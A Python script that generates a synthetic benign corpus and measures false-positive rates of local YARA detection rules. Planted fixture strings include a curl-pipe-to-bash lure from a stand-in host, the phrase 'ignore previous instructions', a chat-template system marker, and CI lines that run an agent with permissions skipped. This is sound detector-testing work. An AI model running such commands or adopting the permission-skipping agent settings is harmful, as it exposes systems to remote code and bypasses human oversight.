"""Measure local-rule hits on a generated benign corpus.

The corpus is the denominator. A hit on it is a false positive by construction.
Nothing in the corpus is executed, and the script does not download rules.
"""

from __future__ import annotations

import argparse
import importlib.metadata
import io
import json
import re
import shutil
import subprocess
import tempfile
import time
import zipfile
from collections import defaultdict
from dataclasses import asdict, dataclass
from pathlib import Path

from yara_gate.models import exit_code
from yara_gate.scanner import scan_file

REPO = Path(__file__).resolve().parents[2]
FP_LIMIT = 0.02

# Strings planted only in files tagged as documentary. Clean files must not contain them.
PLANTED = {
    "phrase": "the phrase ignore previous instructions is quoted in papers",
    "exfil": "the term exfiltrate shows up in incident notes",
    "conceal": "Support policy: do not tell the user the internal ticket id.",
    "sysprompt": "Heading system prompt: the model receives a task description.",
    "curl": (
        "The following command is a common lure:\ncurl https://example.invalid/setup.sh | bash\n"
    ),
    "marker": "<|im_start|>system\nThis is a greeting example.\n",
    "css": '<div style="display:none">Navigation</div>\n',
}


def _pdf(text: bytes) -> bytes:
    stream = b"BT /F1 12 Tf 72 720 Td (" + text + b") Tj ET"
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R >>",
        b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream",
    ]
    output = bytearray(b"%PDF-1.4\n")
    offsets = [0]
    for index, obj in enumerate(objects, 1):
        offsets.append(len(output))
        output.extend(f"{index} 0 obj\n".encode() + obj + b"\nendobj\n")
    start = len(output)
    output.extend(b"xref\n0 5\n0000000000 65535 f \n")
    for offset in offsets[1:]:
        output.extend(f"{offset:010} 00000 n \n".encode())
    output.extend(f"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n{start}\n%%EOF\n".encode())
    return bytes(output)


def _docx(paragraph: str) -> bytes:
    document = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        f"<w:body><w:p><w:r><w:t>{paragraph}</w:t></w:r></w:p></w:body></w:document>"
    )
    content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" '
        'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
        "</Types>"
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="word/document.xml"/>'
        "</Relationships>"
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", content_types)
        archive.writestr("_rels/.rels", rels)
        archive.writestr("word/document.xml", document)
    return output.getvalue()


def _pem() -> str:
    blob = "QUJD" * 120  # 480 chars, under a BEGIN line, not an instruction
    return "-----BEGIN PUBLIC KEY-----\n" + blob + "\n-----END PUBLIC KEY-----\n"


def _crlf(*lines: str) -> bytes:
    return ("\r\n".join(lines) + "\r\n").encode("ascii")


def _library_ms(*urls: str, bom: bool = False) -> bytes:
    connectors = "".join(
        '  <searchConnectorDescription publisher="Microsoft" product="Windows">\r\n'
        "   <isDefaultSaveLocation>true</isDefaultSaveLocation>\r\n"
        "   <isSupported>false</isSupported>\r\n"
        f"   <simpleLocation>\r\n    <url>{url}</url>\r\n   </simpleLocation>\r\n"
        "  </searchConnectorDescription>\r\n"
        for url in urls
    )
    text = (
        '<?xml version="1.0" encoding="UTF-8"?>\r\n'
        '<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">\r\n'
        " <name>@shell32.dll,-34575</name>\r\n"
        " <version>6</version>\r\n"
        " <isLibraryPinned>true</isLibraryPinned>\r\n"
        " <iconReference>imageres.dll,-1002</iconReference>\r\n"
        " <templateInfo>\r\n"
        "  <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>\r\n"
        " </templateInfo>\r\n"
        f" <searchConnectorDescriptionList>\r\n{connectors} </searchConnectorDescriptionList>\r\n"
        "</libraryDescription>\r\n"
    )
    return (b"\xef\xbb\xbf" if bom else b"") + text.encode("ascii")


def _search_connector(url: str) -> bytes:
    return _crlf(
        '<?xml version="1.0" encoding="UTF-8"?>',
        '<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">',
        " <description>Team reports</description>",
        " <isSearchOnlyItem>false</isSearchOnlyItem>",
        " <includeInStartMenuScope>true</includeInStartMenuScope>",
        f" <simpleLocation>\r\n  <url>{url}</url>\r\n </simpleLocation>",
        "</searchConnectorDescription>",
    )


def _windows_files() -> list[tuple[str, bytes, str]]:
    """Shortcut-family files Explorer reads when it lists a folder.

    The tagged files are shapes docs/rules.md names as matches for an advisory rule. They stay
    in the denominator so the measurement reports those collisions.
    """
    folders = {
        "Documents": (
            "FDD39AD0-238F-46AF-ADB4-6C85480369C7",
            "ED4824AF-DCE4-45A8-81E2-FC7965083634",
        ),
        "Music": ("4BD8D571-6D19-48D3-BE97-422220080E43", "3214FAB5-9757-4298-BB61-92A9DEAA44FF"),
        "Pictures": (
            "33E28130-4E1E-4676-835A-98395C3BC3BB",
            "B6EBFB86-6907-413C-9AF7-4FC2ABF07CC5",
        ),
        "Videos": ("18989B1D-99B5-455B-841C-AB7C74E4DDFC", "2400183A-6185-49FB-A2D8-4A392A602BA3"),
    }
    files = [
        (
            f"windows/libraries/{name}.library-ms",
            _library_ms(*(f"knownfolder:{{{guid}}}" for guid in guids), bom=index % 2 == 0),
            "",
        )
        for index, (name, guids) in enumerate(folders.items())
    ]
    projects = _library_ms(r"C:\Users\Public\Projects", r"D:\Archive\Projects")
    files += [
        ("windows/libraries/Projects.library-ms", projects, ""),
        (
            "windows/libraries/Team.library-ms",
            _library_ms(r"\\fileserver.corp.example\team"),
            "fileserver-library",
        ),
        (
            "windows/connectors/Reports.searchConnector-ms",
            _search_connector(r"C:\Data\Reports"),
            "",
        ),
        (
            "windows/connectors/Intranet.searchConnector-ms",
            _search_connector("https://intranet.example/sites/reports/Shared%20Documents"),
            "sharepoint-connector",
        ),
    ]
    favorite = (
        "[{000214A0-0000-0000-C000-000000000046}]",
        "Prop3=19,11",
        "[InternetShortcut]",
        "IDList=",
    )
    files += [
        (
            "windows/favorites/Windows docs.url",
            _crlf(
                *favorite,
                "URL=https://learn.microsoft.com/en-us/windows/",
                "IconFile=https://learn.microsoft.com/favicon.ico",
                "IconIndex=1",
                "HotKey=0",
            ),
            "",
        ),
        (
            "windows/favorites/Status page.url",
            _crlf(
                "[DEFAULT]",
                "BASEURL=https://status.example/",
                "[InternetShortcut]",
                "URL=https://status.example/",
            ),
            "",
        ),
        (
            "windows/desktop/Project tracker.url",
            _crlf("[InternetShortcut]", "URL=https://tracker.example/projects/42"),
            "",
        ),
        (
            "windows/desktop/Spacewar.url",
            _crlf(
                *favorite,
                "IconIndex=0",
                "URL=steam://rungameid/480",
                r"IconFile=C:\Program Files (x86)\Steam\steam\games\spacewar.ico",
            ),
            "",
        ),
        (
            "windows/desktop/Mail the team.url",
            _crlf("[InternetShortcut]", "URL=mailto:team@example.com"),
            "",
        ),
        (
            "windows/start-menu/Handbook.url",
            _crlf("[InternetShortcut]", "URL=file:///C:/Program%20Files/Example/docs/index.html"),
            "local-file-url",
        ),
        (
            "windows/desktop/Show Desktop.scf",
            _crlf(
                "[Shell]",
                "Command=2",
                "IconFile=explorer.exe,3",
                "[Taskbar]",
                "Command=ToggleDesktop",
            ),
            "",
        ),
        (
            "windows/desktop/Window Switcher.scf",
            _crlf(
                "[Shell]",
                "Command=1",
                "IconFile=explorer.exe,3",
                "[Taskbar]",
                "Command=WindowsSwitcher",
            ),
            "",
        ),
    ]
    documents = _crlf(
        "[.ShellClassInfo]",
        r"LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21770",
        r"IconResource=%SystemRoot%\system32\imageres.dll,-112",
        r"IconFile=%SystemRoot%\system32\shell32.dll",
        "IconIndex=-235",
    )
    files += [
        # Explorer often writes desktop.ini as UTF-16LE with a byte order mark.
        ("windows/Documents/desktop.ini", b"\xff\xfe" + documents.decode().encode("utf-16-le"), ""),
        (
            "windows/Pictures/desktop.ini",
            _crlf(
                "[.ShellClassInfo]",
                r"LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21779",
                r"IconResource=%SystemRoot%\system32\imageres.dll,-113",
                "[ViewState]",
                "Mode=",
                "Vid=",
                "FolderType=Pictures",
            ),
            "",
        ),
        (
            "windows/OneDrive/desktop.ini",
            _crlf(
                "[.ShellClassInfo]",
                r"IconResource=C:\Program Files\Microsoft OneDrive\OneDrive.exe,0",
            ),
            "",
        ),
        (
            "windows/Dropbox/desktop.ini",
            _crlf(
                "[.ShellClassInfo]",
                r"IconResource=C:\Program Files (x86)\Dropbox\Client\Dropbox.exe,-2302",
                "InfoTip=Dropbox",
            ),
            "",
        ),
        (
            "windows/Branding/desktop.ini",
            _crlf(
                "[.ShellClassInfo]", r"IconResource=\\fileserver.corp.example\branding\folder.ico,0"
            ),
            "fileserver-icon",
        ),
    ]
    return files


def _platform_files() -> list[tuple[str, bytes]]:
    """Build tasks, setup INFs, JXA automation, admin scripts, and .pth files that stay clean."""
    task = (
        '<Project><UsingTask TaskName="Stamp" TaskFactory="RoslynCodeTaskFactory" '
        'AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.Core.dll">'
        '<Task><Code Type="Fragment" Language="cs"><![CDATA[{body}]]></Code></Task>'
        "</UsingTask></Project>\n"
    )
    bodies = (
        'var p = Process.Start("git", "rev-parse HEAD"); Version = p.StandardOutput.ReadToEnd();',
        "File.WriteAllText(Output, Input.ToUpperInvariant());",
        "Log.LogMessage(MessageImportance.High, Name);",
        "var text = client.GetStringAsync(Url).Result; File.WriteAllText(Output, text);",
    )
    files = [
        (f"build/stamp-{i:02d}.targets", task.format(body=b).encode()) for i, b in enumerate(bodies)
    ]
    files.append(
        (
            "build/profile.inf",
            _crlf(
                "[Version]",
                "Signature=$chicago$",
                "AdvancedINF=2.5",
                "[DefaultInstall]",
                "RunPreSetupCommands=RunPreSetupCommandsSection",
                "CopyFiles=Profile.CopyFiles",
                "[RunPreSetupCommandsSection]",
                "cmmgr32.exe /s /u Profile.inf",
                "[Profile.CopyFiles]",
                "Profile.cms",
            ),
        )
    )
    files.append(
        (
            "build/driver.inf",
            _crlf("[Version]", 'Signature="$Windows NT$"', "Class=Ports", "[Manufacturer]"),
        )
    )
    files.append(
        (
            "mac/desktop.js",
            b"var app = Application.currentApplication();\napp.includeStandardAdditions = true;\n"
            b"app.doShellScript('ls ~/Desktop');\n",
        )
    )
    files.append(
        (
            "mac/pwtest.sh",
            b'#!/bin/bash\ndscl . -authonly "$1" "$2" && echo valid || echo invalid\n',
        )
    )
    files.append(
        (
            "python/distutils-precedence.pth",
            b"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, "
            b"'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n",
        )
    )
    files.append(("python/_virtualenv.pth", b"import _virtualenv\n"))
    files.append(("python/paths.pth", b"/opt/project/src\n"))
    files.append(
        (
            "python/__editable__.inert-1.0.pth",
            b"import __editable___inert_1_0_finder; __editable___inert_1_0_finder.install()\n",
        )
    )
    return files


def _agent_files() -> list[tuple[str, bytes]]:
    """Code notices, chat about source code, committed agent settings, and unattended CI runs."""
    files: list[tuple[str, bytes]] = []
    notices = (
        "Your verification code is {n}. Do not share this code with anyone.",
        "G-{n} is your Google verification code. Never share it.",
        "WhatsApp code {n}. Don't share this code with others.",
        "{n} is your sign-in code. We will never ask you to send it to us.",
        "Use {n} to verify your phone. If you didn't request it, ignore this text.",
    )
    for index, notice in enumerate(notices * 2):
        files.append((f"sms/code-{index:02d}.txt", notice.format(n=482913 + index).encode()))
    chats = (
        "Can you send me the code here? The function fails on line 12.",
        "Please send the code to me for review before Friday.",
        "Paste the code you got from the OAuth redirect into the terminal.",
        "Please send the password reset link to my work email, I'm locked out.",
        "Run this command: rm -rf node_modules && npm install",
        "To enable developer mode on Android, tap the build number seven times.",
        "Act as a reviewer for this pull request and list risky changes.",
        "Ignore the earlier draft; the new guidance is in section 4.",
        "Disable your VPN before running the installer.",
    )
    for index, chat in enumerate(chats):
        files.append((f"sms/chat-{index:02d}.txt", chat.encode()))
    settings = (
        {"permissions": {"defaultMode": "acceptEdits", "allow": ["Bash(npm test)"]}},
        {"enableAllProjectMcpServers": True},
        {"env": {"ANTHROPIC_BASE_URL": "https://llm-gateway.corp.example"}},
        {
            "hooks": {
                "PostToolUse": [
                    {
                        "matcher": "Edit|Write",
                        "hooks": [{"type": "command", "command": "npx prettier --write ."}],
                    }
                ]
            }
        },
        {"chat.tools.terminal.autoApprove": {"npm test": True}, "editor.formatOnSave": True},
    )
    for index, value in enumerate(settings):
        files.append((f"agents/settings-{index:02d}.json", json.dumps(value, indent=2).encode()))
    files.append(
        ("agents/config.toml", b'approval_policy = "never"\nsandbox_mode = "workspace-write"\n')
    )
    for index in range(3):
        files.append(
            (
                f"agents/review-{index:02d}.yml",
                (
                    b"      - run: claude -p --dangerously-skip-permissions 'Fix lint errors'\n"
                    b"        env:\n"
                    b"          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}\n"
                    b"      - run: cp .env.example .env\n"
                ),
            )
        )
    for index in range(3):
        files.append(
            (
                f"scripts/netrc-{index:02d}.sh",
                f"curl --netrc-file ~/.netrc -o out-{index}.json https://example.invalid/api\n".encode(),
            )
        )
    return files


def build_corpus(root: Path) -> dict[str, str]:
    """Write benign files. Return name -> plant tag (empty when the file is ordinary)."""
    tags: dict[str, str] = {}

    def add(name: str, data: bytes, tag: str = "") -> None:
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        tags[name] = tag

    for index in range(40):
        add(
            f"readme/readme-{index:02d}.md",
            (
                f"# Project {index}\n\n"
                "Install with the locked environment. Run the status command. "
                "Report bugs in the issue tracker.\n"
            ).encode(),
        )
    languages = ("py", "rs", "js", "go")
    for index in range(30):
        suffix = languages[index % 4]
        add(
            f"code/sample-{index:02d}.{suffix}",
            (f"def or_fn sample_{index}() {{\n    return {index} + 1;\n}}\n").encode(),
        )
    for index in range(20):
        add(
            f"chat/chat-{index:02d}.txt",
            (
                f"user: Where is the design note {index}?\n"
                "assistant: It is in the docs folder next to the readme.\n"
            ).encode(),
        )
    for index in range(20):
        add(
            f"notes/security-note-{index:02d}.md",
            (
                f"# Review {index}\n\n"
                "This note describes authentication, logging, and loopback binding. "
                "It does not ask a model to change its task.\n"
            ).encode(),
        )
    for index in range(12):
        add(f"pdf/notes-{index:02d}.pdf", _pdf(f"Quarterly notes {index}".encode()))
    for index in range(12):
        add(f"office/notes-{index:02d}.docx", _docx(f"Quarterly notes {index}"))
    for index in range(10):
        add(
            f"config/app-{index:02d}.json",
            json.dumps({"name": f"app-{index}", "port": 8787, "enabled": False}).encode() + b"\n",
        )
    for index in range(10):
        add(
            f"config/app-{index:02d}.yaml",
            f"name: app-{index}\nport: 8787\nenabled: false\n".encode(),
        )
    for index in range(8):
        add(
            f"web/page-{index:02d}.html",
            (
                f"<html><body><h1>Status {index}</h1><p>All checks passed.</p></body></html>\n"
            ).encode(),
        )
    for index in range(8):
        add(f"tables/rows-{index:02d}.csv", f"id,name\n{index},widget\n".encode())
    for index in range(8):
        add(
            f"scripts/fetch-{index:02d}.sh",
            f"curl -fsSL -o /tmp/notes-{index}.txt https://example.invalid/notes.txt\n".encode(),
        )
    for index in range(8):
        add(
            f"images/icon-{index:02d}.svg",
            (
                b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">'
                b'<rect width="16" height="16" fill="#ccc"/></svg>\n'
            ),
        )
    for index in range(6):
        add(
            f"plist/Info-{index:02d}.plist",
            (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<plist version="1.0"><dict>'
                f"<key>CFBundleIdentifier</key><string>com.example.app{index}</string>"
                "<key>CFBundleName</key><string>Example</string>"
                "</dict></plist>\n"
            ).encode(),
        )
    for index in range(8):
        add(
            f"logs/app-{index:02d}.log",
            f"2026-10-23T12:00:0{index}Z info request finished status=200\n".encode(),
        )
    for index in range(6):
        add(f"blobs/short-{index:02d}.txt", (b"A" * 40) + b"\n")
    for name, data, tag in _windows_files():
        add(name, data, tag)
    for name, data in _platform_files():
        add(name, data)
    for name, data in _agent_files():
        add(name, data)

    for index in range(8):
        body = (PLANTED["phrase"] + f" ({index})\n").encode()
        add(f"planted/phrase-{index:02d}.md", body, "phrase")
    for index in range(6):
        body = (PLANTED["exfil"] + f" ({index})\n").encode()
        add(f"planted/exfil-{index:02d}.md", body, "exfil")
    for index in range(6):
        body = (PLANTED["conceal"] + f" ({index})\n").encode()
        add(f"planted/conceal-{index:02d}.md", body, "conceal")
    for index in range(4):
        add(
            f"planted/sysprompt-{index:02d}.md",
            (PLANTED["sysprompt"] + f" ({index})\n").encode(),
            "sysprompt",
        )
    for index in range(5):
        add(f"planted/curl-{index:02d}.md", (PLANTED["curl"] + f"({index})\n").encode(), "curl")
    for index in range(3):
        add(f"planted/marker-{index:02d}.txt", PLANTED["marker"].encode(), "marker")
    for index in range(2):
        add(f"planted/css-{index:02d}.html", PLANTED["css"].encode(), "css")
    for index in range(6):
        add(f"planted/pem-{index:02d}.txt", _pem().encode(), "pem")
    return tags


def _declared_rules() -> list[str]:
    names: list[str] = []
    for path in sorted((REPO / "rules/local").iterdir()):
        if path.suffix not in {".yar", ".yara"}:
            continue
        names.extend(re.findall(r"(?m)^rule\s+([A-Za-z0-9_]+)", path.read_text(encoding="utf-8")))
    return names


def _rules_copy(destination: Path) -> Path:
    rules = destination / "rules"
    shutil.copytree(REPO / "rules/local", rules / "local")
    shutil.copy2(REPO / "rules/rules.lock", rules / "rules.lock")
    return rules


@dataclass
class HitRow:
    rule_id: str
    files: int
    fp_rate: float
    over_limit: bool
    paths: list[str]


@dataclass
class PrecisionReport:
    revision: str
    yara_x: str
    files: int
    fp_limit: float
    seconds: float
    incomplete: list[dict[str, str]]
    rows: list[HitRow]
    planted: dict[str, int]


def measure(corpus: Path, planted: dict[str, int]) -> PrecisionReport:
    started = time.perf_counter()
    hits: dict[str, list[str]] = defaultdict(list)
    incomplete: list[dict[str, str]] = []
    files = 0
    with tempfile.TemporaryDirectory(prefix="yara-gate-precision-rules-") as directory:
        rules = _rules_copy(Path(directory))
        for path in sorted(corpus.rglob("*")):
            if not path.is_file():
                continue
            files += 1
            result = scan_file(path, rules_dir=rules)
            name = path.relative_to(corpus).as_posix()
            if result.incomplete_reason:
                incomplete.append({"file": name, "reason": result.incomplete_reason})
                continue
            if exit_code(result) not in (0, 1):
                incomplete.append({"file": name, "reason": f"exit {exit_code(result)}"})
            for finding in result.findings:
                hits[finding.rule_id].append(name)
    elapsed = time.perf_counter() - started
    rows: list[HitRow] = []
    for rule_id, names in sorted(hits.items()):
        unique = sorted(set(names))
        rate = len(unique) / files if files else 0.0
        rows.append(
            HitRow(
                rule_id=rule_id,
                files=len(unique),
                fp_rate=round(rate, 4),
                over_limit=rate > FP_LIMIT + 1e-12,
                paths=unique,
            )
        )
    seen = {row.rule_id for row in rows}
    for rule_id in _declared_rules():
        if rule_id not in seen:
            rows.append(HitRow(rule_id=rule_id, files=0, fp_rate=0.0, over_limit=False, paths=[]))
    rows.sort(key=lambda row: row.rule_id)
    git = shutil.which("git")
    if git is None:
        raise RuntimeError("git is required to record the scanned revision")
    revision = subprocess.check_output(  # noqa: S603 - fixed read-only argv, no shell
        [git, "rev-parse", "HEAD"], cwd=REPO, text=True
    ).strip()
    return PrecisionReport(
        revision=revision,
        yara_x=importlib.metadata.version("yara-x"),
        files=files,
        fp_limit=FP_LIMIT,
        seconds=round(elapsed, 3),
        incomplete=incomplete,
        rows=rows,
        planted=planted,
    )


def markdown(report: PrecisionReport) -> str:
    lines = [
        "# Local rule false positives on the benign corpus",
        "",
        f"Revision `{report.revision}`. YARA-X `{report.yara_x}`.",
        f"Files: {report.files}. Incomplete: {len(report.incomplete)}. "
        f"One scan pass took {report.seconds} seconds.",
        "",
        "The rate is files hit divided by files scanned.",
        "A rule over 2% is over the bar.",
        "This corpus has no true positives, so the rate is a false-positive rate.",
        "It is not a precision ratio.",
        "",
        "Tagged files (planted documentary text or a documented Windows collision):",
    ]
    for tag, count in sorted(report.planted.items()):
        lines.append(f"- `{tag}`: {count} files")
    lines.extend(
        [
            "",
            "| Rule | Files hit | Rate | Over 2% |",
            "| --- | ---: | ---: | --- |",
        ]
    )
    if not report.rows:
        lines.append("| (none) | 0 | 0 | no |")
    for row in report.rows:
        flag = "yes" if row.over_limit else "no"
        lines.append(f"| `{row.rule_id}` | {row.files} | {row.fp_rate:.2%} | {flag} |")
    lines.append("")
    return "\n".join(lines)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--write", type=Path, help="Write the markdown table to this path")
    parser.add_argument("--json", type=Path, help="Write the raw report")
    parser.add_argument(
        "--fail-over",
        action="store_true",
        help="Exit 1 when any rule exceeds the false-positive limit or a scan is incomplete",
    )
    args = parser.parse_args()
    with tempfile.TemporaryDirectory(prefix="yara-gate-benign-") as directory:
        corpus = Path(directory)
        tags = build_corpus(corpus)
        planted: dict[str, int] = defaultdict(int)
        for tag in tags.values():
            if tag:
                planted[tag] += 1
        report = measure(corpus, dict(planted))
    text = markdown(report)
    print(text)
    payload = asdict(report)
    if args.json:
        args.json.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    if args.write:
        args.write.parent.mkdir(parents=True, exist_ok=True)
        args.write.write_text(text, encoding="utf-8")
    over = [row.rule_id for row in report.rows if row.over_limit]
    if args.fail_over and (over or report.incomplete):
        raise SystemExit(f"over limit: {over}; incomplete: {report.incomplete}")


if __name__ == "__main__":
    main()
